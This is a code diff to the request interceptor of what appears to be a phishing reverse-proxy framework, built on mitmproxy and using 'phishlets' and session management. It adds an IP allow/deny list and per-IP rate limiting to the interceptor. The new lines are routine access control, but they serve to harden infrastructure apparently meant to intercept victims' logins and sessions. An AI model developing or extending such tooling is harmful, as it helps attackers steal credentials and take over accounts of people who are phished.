@@ -22,6 +22,9 @@ except Exception:
         pass
 from core.edge.phishlets import PhishletConfig, PhishletLoader
 from core.edge.session import SessionManager
+from core.common import config
+from core.common.metrics import RATE_LIMITED, BLOCKED_IP
+import time
 
 class VantaInterceptor:
     def __init__(self, phishlet: PhishletConfig, session_manager: SessionManager):
@@ -29,6 +32,10 @@ class VantaInterceptor:
         self.session_manager = session_manager
         self.logger = logging.getLogger("vantablack.edge.interceptor")
         self.logger.info(f"Interceptor loaded for phishlet: {phishlet.name}")
+        self.limit_per_min = config.get_int("RATE_LIMIT_PER_MINUTE", 120)
+        self.allow_ips = set(config.get_list("ALLOW_IPS"))
+        self.deny_ips = set(config.get_list("DENY_IPS"))
+        self._buckets = {}  # ip -> [timestamps]
 
     def request(self, flow: http.HTTPFlow):
         """
@@ -39,6 +46,32 @@ class VantaInterceptor:
         4. Path rewrites & blocklist
         """
         host = flow.request.pretty_host
+        client_ip = "0.0.0.0"
+        try:
+            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]  # type: ignore
+        except Exception:
+            pass
+        # ACL
+        if (self.allow_ips and client_ip not in self.allow_ips) or (client_ip in self.deny_ips):
+            try:
+                BLOCKED_IP.labels(ip=client_ip).inc()
+                if hasattr(http, "Response"):
+                    flow.response = http.Response.make(403, b"Forbidden", {})
+                    return
+            except Exception:
+                return
+        # Rate limit
+        now = time.time()
+        bucket = self._buckets.setdefault(client_ip, [])
+        # purge entries older than 60s
+        bucket[:] = [t for t in bucket if now - t < 60]
+        if len(bucket) >= self.limit_per_min:
+            RATE_LIMITED.labels(ip=client_ip).inc()
+            if hasattr(http, "Response"):
+                flow.response = http.Response.make(429, b"Too Many Requests", {})
+                return
+        else:
+            bucket.append(now)
         
         # TODO: Dynamic mapping based on loaded phishlet
         # For prototype, we assume the first proxy_host maps to target
